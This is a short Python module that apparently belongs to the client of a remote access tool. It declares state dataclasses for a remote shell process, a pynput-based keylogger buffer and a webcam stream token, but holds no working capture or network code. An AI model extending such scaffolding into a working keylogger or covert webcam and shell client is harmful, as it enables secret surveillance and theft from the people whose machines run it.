from __future__ import annotations

import threading
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from pynput.keyboard import Listener


@dataclass
class ShellState:
    proc: object | None = None
    lock: threading.Lock = field(default_factory=threading.Lock)


@dataclass
class KeyloggerState:
    running: bool = False
    buffer: list[str] = field(default_factory=list)
    lock: threading.Lock = field(default_factory=threading.Lock)
    listener: "Listener | None" = None


@dataclass
class ClientState:
    shell: ShellState = field(default_factory=ShellState)
    keylogger: KeyloggerState = field(default_factory=KeyloggerState)
    webcam_stream_running: bool = False
    webcam_stream_token: str | None = None
